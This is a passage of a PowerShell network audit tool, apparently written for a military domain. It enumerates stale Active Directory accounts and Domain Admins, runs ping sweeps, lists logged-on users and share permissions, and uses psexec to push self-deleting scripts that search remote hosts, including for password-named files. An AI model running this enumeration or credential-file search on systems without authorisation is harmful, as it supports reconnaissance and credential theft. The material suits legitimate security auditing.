        $User = $result.GetDirectoryEntry()
        $user.SAMAccountName
    }
}

#Convert Date values into time ticks
Function ConvertDate
{
	param($Day)
	
    #Convert to datetime.
    $Date = [DateTime]"$Day"

    # Correct for daylight savings.
    If ($Date.IsDaylightSavingTime)
    {
        $Date = $Date.AddHours(-1)
    }

    # Convert the datetime value, in UTC, into the number of ticks since
    # 12:00 AM January 1, 1601.
    $Value = ($Date.ToUniversalTime()).Ticks - ([DateTime]"January 1, 1601").Ticks
    return $Value
}

#get stale and non-compliant accounts
Function staleAccounts
{
    #Variables to hold dates (30 & 45 days ago) 
    $30Days = (get-date).adddays(-30)
    $45Days = (get-date).adddays(-45)

    #Create a new object to search Active directory
    #[ADSI]“" searches begining in the the root of your current domain 
    #you can change where your search starts by specifying the AD location
    #example: [ADSI]“LDAP://OU=CANES Users and Computers,DC=cvn76,DC=navy,DC=mil”
    $Search = New-Object DirectoryServices.DirectorySearcher([ADSI]“”)
    $Search.PageSize = 1000

    #Active accounts with no password expiration and no CLO enforced
    Write-Output "
---------------------------------------------------------------
Active accounts with no password expiration and no CLO enforced
---------------------------------------------------------------"

    $Search.filter = “(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536)(!(userAccountControl:1.2.840.113556.1.4.803:=262144))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))”
    GetResults($Search.Findall()) | sort

    #Disabled accounts with no password expitation and no CLO enforced
    Write-Output "
-----------------------------------------------------------------
Disabled accounts with no password expiration and no CLO enforced
-----------------------------------------------------------------"

    $Search.filter = “(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536)(!(userAccountControl:1.2.840.113556.1.4.803:=262144))(userAccountControl:1.2.840.113556.1.4.803:=2))”
    GetResults($Search.Findall()) | sort

    #Active accounts that haven't been accessed in 30 days
    Write-Output "
---------------------------------------
Active accounts not accessed in 30 days
---------------------------------------"

    $Value = ConvertDate($30Days)

    $Search.filter = “(&(objectCategory=person)(objectClass=user)(lastLogon<=$Value)(!(lastLogon=0))(!(userAccountControl:1.2.840.113556.1.4.803:=2))(!(lockoutTime>=1)))”
    GetResults($Search.Findall()) | sort

    #Accounts not accessed in 45 days
    Write-Output "
--------------------------------
Accounts not accessed in 45 days
--------------------------------"

    $Value = ConvertDate($45Days)

    #UTC date for whencreated comparison
    $Value2 = $45Days.ToString("yyhhmmss.0Z")

    $Search.filter = “(|(&(objectCategory=person)(objectClass=user)(lastLogon<=$Value)(!(lastLogon=0)))(&(objectCategory=person)(objectClass=user)(whenCreated<=$Value2)(|(!(lastLogon=*))(lastLogon=0))))”
    GetResults($Search.Findall()) | sort
}

Function UserAccountScan
{
	net group "Domain Admins" /domain |Out-File "$OUT_DIR\DomainAdmins$((get-date).tostring("HHmmss")).txt" #get list of domain admins
	Write-Host -ForegroundColor Yellow "Collecting active directory user account data."
	StaleAccounts |Out-File "$OUT_DIR\$outfile"
	Write-Host -ForegroundColor Green "Data located at $OUT_DIR\$outfile
	"
}

#Return a list of windows machines on the domain
Function GetComputers
{
    #Create a new object to search Active directory
    #[ADSI]“" searches beginning in the the root of your current domain 
    #you can change where your search starts by specifying the AD location
    #example: [ADSI]“LDAP://OU=CANES Users and Computers,DC=cvn76,DC=navy,DC=mil”
	
	param($HostFile)
	$Search = New-Object DirectoryServices.DirectorySearcher([ADSI]"LDAP://$DistinguishedName")
	$Search.PageSize = 1000 #page size needed to return more than 1000 entries
	if(-not ($HostFile -eq "ALL")) #host names to scan provided by user
	{
		$Hosts = Get-Content $HostFile
		RunScriptBlock $GetComputersSB $Hosts $scan | sort -Unique
	}
	else #grab all computers
	{
		$Search.filter = "(objectClass=computer)"
		Foreach($result in $Search.Findall())
		{
			$result.GetDirectoryEntry()|%{
				$name=$_.name
				$os=$_.OperatingSystem
				$ver=$_.OperatingSystemVersion
				"$name,$os,$ver" | Select-String "Windows" | Select-String -NotMatch $env:COMPUTERNAME
			}
		}
	}
}

Function GetActiveComputers
{
	(get-Date).ToString() | Write-Host
	Write-Host -ForegroundColor Yellow "Generating list of active computers"
	$ScannedHosts = "Scanned_Hosts$((get-date).tostring("HHmmss")).csv"
	$Threads = $scan.Throttle #store number of threads
	$scan.Throttle = $scan.Throttle * 5 #lots of network delay for absent hosts so increase thread count for runspace
	if($scan.Throttle -gt 50){$scan.Throttle = 50}
	$scan.DomainName = $DistinguishedName
	[string[]] $Computers = GetComputers $ScanHostsFile
	#$computers|add-content "$OUT_DIR\computers.txt"
	[string[]] $ActiveComputers = RunScriptBlock $ActiveComputers_SB $Computers $scan
	$scan.Throttle = $Threads #re-set throttle

	$ActiveComputers = $ActiveComputers | Sort -Unique | Select-String -NotMatch $env:COMPUTERNAME #remove scanning machine and any duplicates
	$numActOrig = $ActiveComputers.count #number of active computers returned
	
	#Write list of computers to file starting with column names
	"Host Name,IP Address,Operating System,Version"|Add-Content "$TEMP_DIR\$ScannedHosts"
	$ActiveComputers |Add-Content "$TEMP_DIR\$ScannedHosts"
	ConvertFileFormat "$TEMP_DIR\$ScannedHosts" $true 
	
	#list of computers has been generated
	$Script:FirstRunComps = $false 
	$numTot = $Computers.count
	$numAct = $ActiveComputers.Count
	$numDif = $numActOrig - $numAct #in case there were duplicate hosts found
	$numTot = $numTot - $numDif
	Write-Host -ForegroundColor Yellow "$numAct/$numTot active computers found
	"
	#Store a timestamp for when list of computers was generated to update list after time
	$script:CompsDate = Get-Date 
	return $ActiveComputers
}

Function VerifyIP
{
	param($IP, $CIDR)
	
	$Octets = $IP.split(".")
	if($Octets.count -ne 4){Return $false}
	
	if($CIDR)
	{
		$CIDR = [convert]::ToInt32($CIDR, 10)
		if(-not (($CIDR -ge 1) -and ($CIDR -le 32)))
		{
			Return $false
		}
	}	
	
	for($i=0; $i -lt 4; $i++)
	{
		$num = [convert]::ToInt32($Octets[$i], 10)
		if(-not (($num -le 255) -and ($num -ge 0))){
			Return $false
		}
	}
	Return $true
}

Function Get-IPSubnet 
{ 
 
        Param( 
        [Parameter(Mandatory = $true)] 
        [Array] $Subnets 
        ) 
 
	foreach($subnet in $Subnets){ 
 
		#Split IP and subnet 
		$IP = ($Subnet -split "\/")[0] 
		$CIDR = ($Subnet -split "\/")[1]
		
		if(-not (VerifyIP $IP $CIDR))
		{
			Write-Host -ForegroundColor Red "Invalid subnet: $subnet"
			Return $false
		}
	}
	
	foreach($subnet in $Subnets)
	{

		#Split IP and subnet 
		$IP = ($Subnet -split "\/")[0] 
		
        $SubnetBits = ($Subnet -split "\/")[1] 
         
        #Convert IP into binary 
        #Split IP into different octects and for each one, figure out the binary with leading zeros and add to the total 
        $Octets = $IP -split "\." 
        $IPInBinary = @() 
        foreach($Octet in $Octets) 
            { 
                #convert to binary 
                $OctetInBinary = [convert]::ToString($Octet,2) 
                 
                #get length of binary string add leading zeros to make octet 
                $OctetInBinary = ("0" * (8 - ($OctetInBinary).Length) + $OctetInBinary) 
 
                $IPInBinary = $IPInBinary + $OctetInBinary 
            } 
        $IPInBinary = $IPInBinary -join "" 
 
        #Get network ID by subtracting subnet mask 
        $HostBits = 32-$SubnetBits 
        $NetworkIDInBinary = $IPInBinary.Substring(0,$SubnetBits) 
         
        #Get host ID and get the first host ID by converting all 1s into 0s 
        $HostIDInBinary = $IPInBinary.Substring($SubnetBits,$HostBits)         
        $HostIDInBinary = $HostIDInBinary -replace "1","0" 
 
        #Work out all the host IDs in that subnet by cycling through $i from 1 up to max $HostIDInBinary (i.e. 1s stringed up to $HostBits) 
        #Work out max $HostIDInBinary 
        $imax = [convert]::ToInt32(("1" * $HostBits),2) -1 
 
        $IPs = @() 
 
        #Next ID is first network ID converted to decimal plus $i then converted to binary 
        For ($i = 1 ; $i -le $imax ; $i++) 
            { 
                #Convert to decimal and add $i 
                $NextHostIDInDecimal = ([convert]::ToInt32($HostIDInBinary,2) + $i) 
                #Convert back to binary 
                $NextHostIDInBinary = [convert]::ToString($NextHostIDInDecimal,2) 
                #Add leading zeros 
                #Number of zeros to add  
                $NoOfZerosToAdd = $HostIDInBinary.Length - $NextHostIDInBinary.Length 
                $NextHostIDInBinary = ("0" * $NoOfZerosToAdd) + $NextHostIDInBinary 
 
                #Work out next IP 
                #Add networkID to hostID 
                $NextIPInBinary = $NetworkIDInBinary + $NextHostIDInBinary 
                #Split into octets and separate by . then join 
                $IP = @() 
                For ($x = 1 ; $x -le 4 ; $x++) 
                    { 
                        #Work out start character position 
                        $StartCharNumber = ($x-1)*8 
                        #Get octet in binary 
                        $IPOctetInBinary = $NextIPInBinary.Substring($StartCharNumber,8) 
                        #Convert octet into decimal 
                        $IPOctetInDecimal = [convert]::ToInt32($IPOctetInBinary,2) 
                        #Add octet to IP  
                        $IP += $IPOctetInDecimal 
                    } 
 
                #Separate by . 
                $IP = $IP -join "." 
                $IPs += $IP 
            } 
        $IPs 
    } 
}

Function Get-IPRange 
{

        Param( 
        [Parameter(Mandatory = $true)] 
        [Array] $Ranges 
        ) 
		
	foreach($Range in $Ranges){ 
 
		#Split IP and subnet 
		$StartIP = $Range.split("-")[0]
		$EndIP = $Range.split("-")[1]

		if(-not (VerifyIP $StartIP))
		{
			Write-Host -ForegroundColor Red "Invalid range: $Range"
			Return $false
		}
		if(-not (VerifyIP $EndIP))
		{
			Write-Host -ForegroundColor Red "Invalid range: $Range"
			Return $false
		}
	}
	
	foreach($Range in $Ranges)
	{ 	
		$TempIPArray = $Range.split("-")
		$TempIPArray = [System.Version[]] ($TempIPArray) | Sort-Object
		$StartIP = $TempIPArray[0].ToString()
		$EndIP = $TempIPArray[1].ToString()
	
		$StartOct1 = [convert]::ToInt32($StartIP.split(".")[0], 10)
		$StartOct2 = [convert]::ToInt32($StartIP.split(".")[1], 10)
		$StartOct3 = [convert]::ToInt32($StartIP.split(".")[2], 10)
		$StartOct4 = [convert]::ToInt32($StartIP.split(".")[3], 10)
		
		$EndOct1 = [convert]::ToInt32($EndIP.split(".")[0], 10)
		$EndOct2 = [convert]::ToInt32($EndIP.split(".")[1], 10)
		$EndOct3 = [convert]::ToInt32($EndIP.split(".")[2], 10)
		$EndOct4 = [convert]::ToInt32($EndIP.split(".")[3], 10)
		
		for($i=0; $i -lt 4; $i++)
		{
			$num = [convert]::ToInt32($StartIP.split(".")[$i], 10)
			if(-not (($num -le 255) -and ($num -ge 0))){
				Write-Host -ForegroundColor Red "Invalid IP range: $Range"
				$invalid=$true
			}
		}
		if($invalid){$invalid=$false; continue}
		
		for($i=0; $i -lt 4; $i++)
		{
			$num = [convert]::ToInt32($EndIP.split(".")[$i], 10)
			if(-not (($num -le 255) -and ($num -ge 0))){
				Write-Host -ForegroundColor Red "Invalid IP range: $Range"
				$invalid=$true
			}
		}
		if($invalid){$invalid=$false; continue}
		
		for($StartOct1; $StartOct1 -le $EndOct1; $StartOct1++){
			if(-not ($StartOct1 -eq $EndOct1)){
						$TempEnd2 = 255
			} 
			Else {$TempEnd2 = $EndOct2}
			
			for($StartOct2; $StartOct2 -le $TempEnd2; $StartOct2++){
				if(-not (($StartOct2 -eq $EndOct2) -and ($StartOct1 -eq $EndOct1))){
						$TempEnd3 = 255
				} 
				Else {$TempEnd3 = $EndOct3}

				for($StartOct3; $StartOct3 -le $TempEnd3; $StartOct3++){
					if(-not (($StartOct3 -eq $EndOct3) -and ($StartOct2 -eq $EndOct2) -and ($StartOct1 -eq $EndOct1))){
						$TempEnd4 = 255
					} 
					Else {$TempEnd4 = $EndOct4}
					for($StartOct4; $StartOct4 -le $TempEnd4; $StartOct4++){
						"$StartOct1.$StartOct2.$StartOct3.$StartOct4"
					}
					$StartOct4=0
				}
				$StartOct3=0
			}
			$StartOct2=0
		}
		$IPs
	}
}

Function Get-IPFile 
{

	Param( 
	[Parameter(Mandatory = $true)] 
	[string] $File 
	) 
	
	[Array]$IParray = $null
	$content = Get-Content $File
	
	foreach($IP in $content)
	{
		if($IP|Select-String "-")
		{
			$tempIP = Get-IPRange -Range $IP
			if($tempIP){$IParray =  $IParray + $tempIP}
		}
		elseif($IP|Select-String "/")
		{
			$tempIP = Get-IPSubnet -Subnets "$IP"
			if($tempIP){$IParray =  $IParray + $tempIP}
		}
		else
		{
			if(VerifyIP $IP)
			{
				$IParray =  $IParray + $IP
			}
		}
	}
	$ipsort = [System.Version[]]($IParray) |  Sort-Object
	Return $ipsort
}

Function PingSweep 
{
	Write-Host -ForegroundColor Green "
Ping Sweep
-----------"
	while($true)
	{
		Write-Host "Input IPs as Subnets[1], Range[2], or file[3]: " -NoNewLine
		$Choice = ReadYellow
		switch($Choice)
		{
			1{
				Write-Host "Enter comma separated subnets: " -NoNewLine
				$Input= ReadYellow
				[Array]$IPArray = $Input.split(",")
				$IPList = Get-IPSubnet -Subnets $IPArray
				if($IPList){ExecutePingSweep $IPList}
				Return}
			2{
				Write-Host "Enter IP range: " -NoNewLine
				$Input = ReadYellow
				[Array]$IPArray = $Input.split(",")
				$IPList = Get-IPRange -Range $IPArray
				if($IPList){ExecutePingSweep $IPList}
				Return}
			3{
				Write-Host "Enter IP file: " -NoNewLine
				$Input= ReadYellow
				if(-not (Test-Path $Input))
				{
					Write-Host -ForegroundColor Red "File not found: $Input"
					Return
				}
				$IPList = Get-IPFile -File $Input
				if($IPList){ExecutePingSweep $IPList}
				Return}
			"h"{Return $false}
			"home"{Return $false}
			"x"{ExitFunction}
			"exit"{ExitFunction}
			default{Write-Host -ForegroundColor Red "Invalid input"}
		}
	}
}

Function ExecutePingSweep
{
	param($IPList)
	
	Write-Host
	
	$Script:Deploy = $false
	$Script:outfile="PingSweep$((get-date).tostring("HHmmss")).csv"
	
	Write-Host $(get-Date)
	Write-Host -ForegroundColor Yellow "Executing ping sweep"
	CreateTempDir
	RunScriptBlock $PingSweepSB $IPList $scan
	ParseData 109
}

Function ChooseFileTypes
{
	Write-Host "
File-types to search.
    
    [0]  ALL
    [1]  Image Files (*.jpg, *.jpeg, *.tif, *.gif, *.bmp)
    [2]  Audio Files (*.m4a, *.m4p, *.mp3, *.wma)
    [3]  Video Files (*.asf, *.avi, *.m4v, *.mov, *.mp4, *.mpeg, *.mpg, *.wmv)
    [4]  Windows Script Files (*.ps1, *.psm1, *.vb, *.vbs, *.bat, *.cmd)
    [5]  Executable Files (*.exe, *.dll, *.sys)
    [6]  Outlook data files (*.pst)
    [7]  Password files (*passw*, *pwd*)
		
Choice: " -NoNewLine
	$ScanChoice = ReadYellow
	Write-Host
	Return ParseMenuChoice $ScanChoice 7
}

Function FileTypeSearch 
{
	Write-Host -ForegroundColor Green "
File Search
-----------"
	while($true)
	{
		Write-Host "Search local path[1] or network share[2]: " -NoNewLine
		$SearchScope = ReadYellow
		switch($SearchScope)
		{
			1{DeployFileSearch; return}
			2{NetShareFileSearch; return}
			"h"{Return $false}
			"home"{Return $false}
			"x"{ExitFunction}
			"exit"{ExitFunction}
			default{Write-Host -ForegroundColor Red "Invalid input"}
		}
	}
}

#deploy file search searches a file path on each local host using psexec
Function DeployFileSearch
{
	$Script:ScanChoiceArray.clear() 
	
	#Array to hold the choices of file-types to search for
	$FileTypesArray = New-Object System.Collections.ArrayList
	Write-Host "
Enter local path to begin search.  
Default is C:\: " -NoNewLine
	$Script:PathToSearch = ReadYellow
	if (-not $Script:PathToSearch){$Script:PathToSearch="C:\"} #default path is C:\
	$FileTypesArray.add($(ChooseFileTypes))|Out-Null 
	
	for($i=0; $i -lt $FileTypesArray.count; $i++)
	{
		#set script variables based on file types
		switch($FileTypesArray[$i])
		{
			1{
				$Script:ScanChoiceArray.add(101)|out-null
				$Script:ImageSearchCode_BAT = '
				@echo off
				IF EXIST "C:\ImageFileSearch392125281" DEL "C:\ImageFileSearch392125281"
				for /R "'+$PathToSearch+'" %%f in (*.jpg *.jpeg *.tif *.gif *.bmp) do (
				echo %COMPUTERNAME%,%%~nxf,%%~dpf
				) >> "C:\ImageFileSearch392125281"
				(goto) 2>nul & del "%~f0"'

				$Script:ImageSearchCode_PS1 = '
				if (Test-Path "C:\ImageFileSearch392125281"){Remove-Item -Force "C:\ImageFileSearch392125281"}
				$include = "*.jpg", "*.jpeg", "*.tif", "*.gif", "*.bmp"
				try{
				Get-ChildItem -path "'+$PathToSearch+'*" -Include $include -Exclude "Application Data", "AppData" -Recurse -Force -ErrorAction silentlycontinue |
				foreach {${env:COMPUTERNAME}+","+$_.Name+","+$_.Directoryname}|
				Out-file "C:\ImageFileSearch392125281"
				} catch {continue}
				Remove-Item -Force "C:\PSExecShellCode.ps1"'
			}
			2{
				$Script:ScanChoiceArray.add(102)|out-null
				$Script:AudioSearchCode_BAT = '
				@echo off
				IF EXIST "C:\AudioFileSearch392125281" DEL "C:\AudioFileSearch392125281"
				for /R "'+$PathToSearch+'" %%f in (*.m4a *.m4p *.mp3 *.wma) do (
				echo %COMPUTERNAME%,%%~nxf,%%~dpf
				) >> "C:\AudioFileSearch392125281"
				(goto) 2>nul & del "%~f0"'
				
				$Script:AudioSearchCode_PS1 = '
				if (Test-Path "C:\AudioFileSearch392125281"){Remove-Item -Force "C:\AudioFileSearch392125281"}
				$include = "*.m4a", "*.m4p", "*.mp3", "*.wma"
				try{
				Get-ChildItem -path "'+$PathToSearch+'*" -Include $include -Exclude "Application Data", "AppData" -Recurse -Force -ErrorAction silentlycontinue |
				foreach {${env:COMPUTERNAME}+","+$_.Name+","+$_.Directoryname}|
				Out-file "C:\AudioFileSearch392125281"
				} catch {continue}
				Remove-Item -Force "C:\PSExecShellCode.ps1"'				
			}
			3{
				$Script:ScanChoiceArray.add(103)|out-null
				$Script:VideoSearchCode_BAT = '
				@echo off
				IF EXIST "C:\VideoFileSearch392125281" DEL "C:\VideoFileSearch392125281"
				for /R "'+$PathToSearch+'" %%f in (*.asf *.avi *.m4v *.mov *.mp4 *.mpeg *.mpg *.wmv) do (
				echo %COMPUTERNAME%,%%~nxf,%%~dpf
				) >> "C:\VideoFileSearch392125281"
				(goto) 2>nul & del "%~f0"'	
				
				$Script:VideoSearchCode_PS1 = '
				if (Test-Path "C:\VideoFileSearch392125281"){Remove-Item -Force "C:\VideoFileSearch392125281"}
				$include = "*.asf", "*.avi", "*.m4v", "*.mov", "*.mp4", "*.mpeg", "*.mpg", "*.wmv"
				try{
				Get-ChildItem -path "'+$PathToSearch+'*" -Include $include -Exclude "Application Data", "AppData" -Recurse -Force -ErrorAction silentlycontinue |
				foreach {${env:COMPUTERNAME}+","+$_.Name+","+$_.Directoryname}|
				Out-file "C:\VideoFileSearch392125281"
				} catch {continue}
				Remove-Item -Force "C:\PSExecShellCode.ps1"'					
			}
			4{
				$Script:ScanChoiceArray.add(104)|out-null
				$Script:ScriptSearchCode_BAT = '
				@echo off
				IF EXIST "C:\ScriptFileSearch392125281" DEL "C:\ScriptFileSearch392125281"
				for /R "'+$PathToSearch+'" %%f in (*.ps1 *.psm1 *.vb *.vbs *.bat *.cmd) do (
				echo %COMPUTERNAME%,%%~nxf,%%~dpf
				) >> "C:\ScriptFileSearch392125281"
				(goto) 2>nul & del "%~f0"'	
				
				$Script:ScriptSearchCode_PS1 = '
				if (Test-Path "C:\ScriptFileSearch392125281"){Remove-Item -Force "C:\ScriptFileSearch392125281"}
				$include = "*.ps1", "*.psm1", "*.vb", "*.vbs", "*.bat", "*.cmd"
				try{
				Get-ChildItem -path "'+$PathToSearch+'*" -Include $include -Exclude "Application Data", "AppData" -Recurse -Force -ErrorAction silentlycontinue |
				foreach {${env:COMPUTERNAME}+","+$_.Name+","+$_.Directoryname}|
				Out-file "C:\ScriptFileSearch392125281"
				} catch {continue}
				Remove-Item -Force "C:\PSExecShellCode.ps1"'				
			}
			5{
				$Script:ScanChoiceArray.add(105)|out-null
				$Script:ExecutableSearchCode_BAT = '
				@echo off
				IF EXIST "C:\ExecutableFileSearch392125281" DEL "C:\ExecutableFileSearch392125281"
				for /R "'+$PathToSearch+'" %%f in (*.exe *.dll *.sys) do (
				echo %COMPUTERNAME%,%%~nxf,%%~dpf
				) >> "C:\ExecutableFileSearch392125281"
				(goto) 2>nul & del "%~f0"'
				
				$Script:ExecutableSearchCode_PS1 = '
				if (Test-Path "C:\ExecutableFileSearch392125281"){Remove-Item -Force "C:\ExecutableFileSearch392125281"}
				$include = "*.exe", "*.dll", "*.sys"
				try{
				Get-ChildItem -path "'+$PathToSearch+'*" -Include $include -Exclude "Application Data", "AppData" -Recurse -Force -ErrorAction silentlycontinue |
				foreach {${env:COMPUTERNAME}+","+$_.Name+","+$_.Directoryname}|
				Out-file "C:\ExecutableFileSearch392125281"
				} catch {continue}
				Remove-Item -Force "C:\PSExecShellCode.ps1"'				
			}
			6{
				$Script:ScanChoiceArray.add(106)|out-null
				$Script:DataFileSearchCode_BAT = '
				@echo off
				IF EXIST "C:\DataFileSearch392125281" DEL "C:\DataFileSearch392125281"
				for /R "'+$PathToSearch+'" %%f in (*.pst) do (
				echo %COMPUTERNAME%,%%~nxf,%%~dpf
				) >> "C:\DataFileSearch392125281"
				(goto) 2>nul & del "%~f0"'	
				
				$Script:DataFileSearchCode_PS1 = '
				if (Test-Path "C:\DataFileSearch392125281"){Remove-Item -Force "C:\DataFileSearch392125281"}
				$include = "*.pst"
				try{
				Get-ChildItem -path "'+$PathToSearch+'*" -Include $include -Exclude "Application Data", "AppData" -Recurse -Force -ErrorAction silentlycontinue |
				foreach {${env:COMPUTERNAME}+","+$_.Name+","+$_.Directoryname}|
				Out-file "C:\DataFileSearch392125281"
				} catch {continue}
				Remove-Item -Force "C:\PSExecShellCode.ps1"'					
			}
			7{
				$Script:ScanChoiceArray.add(107)|out-null
				$Script:PasswordSearchCode_BAT = '
				@echo off
				IF EXIST "C:\PasswordFileSearch392125281" DEL "C:\PasswordFileSearch392125281"
				for /R "'+$PathToSearch+'" %%f in (*passw* *pwd*) do (
				echo %COMPUTERNAME%,%%~nxf,%%~dpf
				) >> "C:\PasswordFileSearch392125281"
				(goto) 2>nul & del "%~f0"'	
				
				$Script:PasswordSearchCode_PS1 = '
				if (Test-Path "C:\PasswordFileSearch392125281"){Remove-Item -Force "C:\PasswordFileSearch392125281"}
				$include = "*passw*", "*pwd*"
				try{
				Get-ChildItem -path "'+$PathToSearch+'*" -Include $include -Exclude "Application Data", "AppData" -Recurse -Force -ErrorAction silentlycontinue |
				foreach {${env:COMPUTERNAME}+","+$_.Name+","+$_.Directoryname}|
				Out-file "C:\PasswordFileSearch392125281"
				} catch {continue}
				Remove-Item -Force "C:\PSExecShellCode.ps1"'				
			}
			"h"{return $false}
			"home"{return $false}
			"x"{ExitFunction}
			"exit"{ExitFunction}
		}
	}
}

#Execute net share file search with progress meter.
Function NetShareFileSearch_Run
{
	param($path, $include, $ScanType)

	#hash table to store variables for progress meter
	$progParam=@{
		Activity = "$ScanType"
		CurrentOperation = $path
		Status="Querying top level folders"
		PercentComplete=0
	} 
	
	Write-Progress @progParam 
	
	#Get all subdirectories in path to search 
	$top = Get-ChildItem -Path $path |Where{$_.PSIsContainer}
	#initialize a counter
	$i=0
	foreach ($folder in $top) {
		$folder=$folder.FullName
		#calculate percentage based on number of folders in path to search
		$i++
		
		#set variables for progress meter
		[int]$pct = ($i/$top.count)*100 
		$progParam.CurrentOperation ="Searching: $folder"
		$progParam.Status="Progress"
		$progParam.PercentComplete = $pct
		
		#Write the progress
		Write-Progress @progParam 
		
		#Perform the file search in the subdirectory of the path
		Get-ChildItem -path "$folder\*" -Include $include -Recurse -Force -ErrorAction silentlycontinue |
		foreach {$_.Name+","+$_.Directoryname}
	}   
}

Function NetShareFileSearch
{
	$FileTypesArray = New-Object System.Collections.ArrayList
	While ($true) #Loop until input is valid
	{
		Write-Host "Enter full path to network share: " -NoNewLine
		$SearchNetworkShare = ReadYellow
		
		#Make sure that input is valid.  
		if ($SearchNetworkShare -and (Test-Path $SearchNetworkShare -ErrorAction SilentlyContinue)) {break}	
		else 
		{
			Write-Host -ForegroundColor Red "Invalid Path
Use format: \\servername\sharename"
		} 
	}
	
	$FileTypesArray.add($(ChooseFileTypes)) #fill array with file types to search
	$Script:Deploy = $false #Search is not executed using psexec

	#iterate through file choices and find files
	for($i=0; $i -lt $FileTypesArray.count; $i++)
	{
		CreateTempDir
		switch ($FileTypesArray[$i])
		{
			1{  #image files
				$script:outfile = "ImageFiles_Share$((get-date).tostring("HHmmss")).csv"
				Write-Host -ForegroundColor Yellow "Searching for image files."
				"File,Directory" | Add-Content "$TEMP_DIR\$outfile"
				$include = "*.jpg", "*.jpeg", "*.tif", "*.gif", "*.bmp"
				NetShareFileSearch_Run $SearchNetworkShare $include "Image Search:" |Add-Content "$TEMP_DIR\$outfile"
				ConvertFileFormat "$TEMP_DIR\$outfile"
			}
			2{  #Audio Files
				$script:outfile = "AudioFiles_Share$((get-date).tostring("HHmmss")).csv"
				Write-Host -ForegroundColor Yellow "Searching for audio files."
				"File,Directory" | Add-Content "$TEMP_DIR\$outfile"
				$include = "*.m4a", "*.m4p", "*.mp3", "*.wma"
				NetShareFileSearch_Run $SearchNetworkShare $include "Audio Search:" |Add-Content "$TEMP_DIR\$outfile"
				ConvertFileFormat "$TEMP_DIR\$outfile"
			}
			3{  #Video Files
				$script:outfile = "VideoFiles_Share$((get-date).tostring("HHmmss")).csv"				
				Write-Host -ForegroundColor Yellow "Searching for video files."
				"File,Directory" | Add-Content "$TEMP_DIR\$outfile"
				$include = "*.asf", "*.avi", "*.m4v", "*.mov", "*.mp4", "*.mpeg", "*.mpg", "*.wmv"
				NetShareFileSearch_Run $SearchNetworkShare $include "Video Search:" |Add-Content "$TEMP_DIR\$outfile"
				ConvertFileFormat "$TEMP_DIR\$outfile"
			}
			4{  #Script Files
				$script:outfile = "ScriptFiles_Share$((get-date).tostring("HHmmss")).csv"				
				Write-Host -ForegroundColor Yellow "Searching for windows script files."
				"File,Directory" | Add-Content "$TEMP_DIR\$outfile"
				$include = "*.ps1", "*.psm1", "*.vb", "*.vbs", "*.bat", "*.cmd"
				NetShareFileSearch_Run $SearchNetworkShare $include "Script Search:" |Add-Content "$TEMP_DIR\$outfile"
				ConvertFileFormat "$TEMP_DIR\$outfile"
			}
			5{ #Executable Files
				$script:outfile = "ExecutableFiles_Share$((get-date).tostring("HHmmss")).csv"				
				Write-Host -ForegroundColor Yellow "Searching for executable files."
				"File,Directory" | Add-Content "$TEMP_DIR\$outfile" 
				$include = "*.exe", "*.dll", "*.sys"
				NetShareFileSearch_Run $SearchNetworkShare $include "Executable Search:" |Add-Content "$TEMP_DIR\$outfile"
				ConvertFileFormat "$TEMP_DIR\$outfile"
			}
			6{  #Outlook data files
				$script:outfile = "OutlookDataFiles_Share$((get-date).tostring("HHmmss")).csv"				
				Write-Host -ForegroundColor Yellow "Searching for Outlook data files."
				"File,Directory" | Add-Content "$TEMP_DIR\$outfile" 
				$include = "*.pst"
				NetShareFileSearch_Run $SearchNetworkShare $include "Outlook Data-file Search:"  |Add-Content "$TEMP_DIR\$outfile"
				ConvertFileFormat "$TEMP_DIR\$outfile"
			}
			7{  #password files
				$script:outfile = "PasswordFiles_Share$((get-date).tostring("HHmmss")).csv"				
				Write-Host -ForegroundColor Yellow "Searching for password files."
				"File,Directory" | Add-Content "$TEMP_DIR\$outfile"
				$include = "*passw*", "*pwd*"
				NetShareFileSearch_Run $SearchNetworkShare $include "Password Search:" |Add-Content "$TEMP_DIR\$outfile"
				ConvertFileFormat "$TEMP_DIR\$outfile"			
			}
		}
	}
}

Function LoggedOnUsers
{
	Write-Host
	if($script:FirstRunComps) #Test to see if list of active computers exists or not
	{		
		$script:ActiveComputers = GetActiveComputers 
	}
	
	$Script:Deploy = $false
	$Script:outfile="LoggedOnUsers$((get-date).tostring("HHmmss")).csv"
	
	Write-Host $(get-Date)
	Write-Host -ForegroundColor Yellow "Enumerating logged on users"
	CreateTempDir
	RunScriptBlock $LoggedOnUsers_SB $ActiveComputers $scan
	ParseData 108
}

Function NetworkSharesPermissions
{
	(get-Date).ToString() | Write-Host
	Write-Host -ForegroundColor Yellow "Enumerating network-share permissions"
	
	if(Test-Path $OUT_DIR) #look for network shares data in $OUT_DIR
	{
		$NetShareFile = $(gci "$OUT_DIR\NetworkShares*.csv" |sort -Property LastWriteTime|select -first 1)
		if(Test-Path "$OUT_DIR\CSV")
		{
			$NetShareFile1 = $(gci "$OUT_DIR\CSV\NetworkShares*.csv" |sort -Property LastWriteTime|select -first 1)
		}
	}
	
	if($NetShareFile) #data found in $OUT_DIR
	{
		#Get list of shares but skip column names and $ shares
		$Shares = (Get-Content $NetShareFile|Select -skip 1|Select-String -SimpleMatch '$' -NotMatch)
	}
	
	elseif($NetShareFile1) #data found in $OUT_DIR\CSV
	{
		$Shares = (Get-Content $NetShareFile1|Select -skip 1|Select-String -SimpleMatch '$' -NotMatch)
	}
	
	else{Write-Host -ForegroundColor Red "Network-shares file not found"; return}

	#Create data file
	"HostName,ShareName,Identity,Permissions,Inherited"|Add-Content "$OUT_DIR\$outfile"
	
	foreach($Share in $Shares){
		$HostName = $Share.ToString().split(",")[0]
		$ShareName = $Share.ToString().split(",")[2]
		if(Test-Path "\\$HostName\$ShareName" -ErrorAction SilentlyContinue)
		{
			(Get-Acl "\\$HostName\$ShareName").Access|%{
				"$HostName,"+
				"\\$HostName\$ShareName,"+
				$_.IdentityReference.tostring()+","+
				$($_.FileSystemRights.tostring() -replace ',', ';')+","+
				$_.IsInherited.tostring()|Add-Content "$OUT_DIR\$outfile"
			}
		}
	}
	ConvertFileFormat "$OUT_DIR\$outfile"
	Move-Item "$OUT_DIR\$outfile" "$OUT_DIR\CSV\$outfile" -ErrorAction SilentlyContinue
}

Function SendRequest
{
	param($hashBlock, $APIKey)
	
    $par = @{
        Uri = 'https://www.virustotal.com/vtapi/v2/file/report'
